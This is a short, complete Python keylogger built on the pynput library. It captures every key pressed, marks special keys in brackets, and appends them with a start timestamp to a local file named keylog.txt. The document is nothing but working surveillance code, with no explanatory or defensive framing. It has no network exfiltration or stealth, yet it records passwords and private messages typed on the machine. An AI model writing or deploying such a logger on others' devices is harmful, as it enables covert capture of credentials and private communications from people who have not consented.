from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

def main():
    with open(LOG_FILE, "a") as f:
        f.write(f"\n\n--- Logging started at {datetime.now()} ---\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
